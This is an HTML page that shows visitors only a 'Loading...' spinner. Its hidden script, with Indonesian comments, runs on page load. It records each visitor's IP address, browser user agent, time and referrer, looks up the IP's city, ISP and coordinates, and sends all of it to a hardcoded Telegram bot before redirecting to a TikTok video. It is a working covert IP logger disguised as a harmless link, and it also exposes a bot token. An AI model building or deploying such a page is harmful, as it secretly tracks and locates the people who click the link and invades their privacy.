<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            color: #fff;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: #1a1a2e;
            border-radius: 16px;
            border: 1px solid #2a2a4a;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #2a2a4a;
            border-top-color: #00FF9D;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        p { color: #888; font-size: 14px; }
    </style>
</head>
<body>

<div class="container">
    <div class="spinner"></div>
    <p>Loading...</p>
</div>

<script>
// ============================================
// 🔴 KONFIGURASI — GANTI INI!
// ============================================

const BOT_TOKEN = "6529101093:AAH7HJ4eS6NDLsK-R7-SUCfRkucRIEgfEgc";
const CHAT_ID = "1650888756";
const REDIRECT_URL = "https://www.tiktok.com/@bbygurllxyz_/video/7633609115247414548";

// ============================================
// 🔴 KIRIM IP KE TELEGRAM
// ============================================

fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        const ip = data.ip;
        const ua = navigator.userAgent;
        const time = new Date().toLocaleString('id-ID');
        const ref = document.referrer || 'Direct';

        const msg = `✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: ${ip}\n📱 ${ua}\n🔗 ${ref}`;

        // Kirim ke Telegram
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
        }).catch(() => {});

        // Ambil Geolokasi dari IP
        fetch(`http://ip-api.com/json/${ip}`)
            .then(r => r.json())
            .then(geo => {
                if (geo.status === 'success') {
                    const geoMsg = `📍 IP GEOLOCATION\n━━━━━━━━━━━━━━━━━━━\n📍 ${geo.city}, ${geo.regionName}\n🌍 ${geo.country}\n📡 ${geo.isp}\n🗺️ ${geo.lat}, ${geo.lon}`;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(geoMsg)}`
                    }).catch(() => {});
                }
            });

        // ✅ REDIRECT KE TIKTOK (PASTI!)
        setTimeout(() => {
            window.location.replace(REDIRECT_URL);
        }, 1500);
    })
    .catch(() => {
        // ❌ GAGAL IP — TETAP REDIRECT!
        setTimeout(() => {
            window.location.replace(REDIRECT_URL);
        }, 1500);
    });
</script>

</body>
</html>
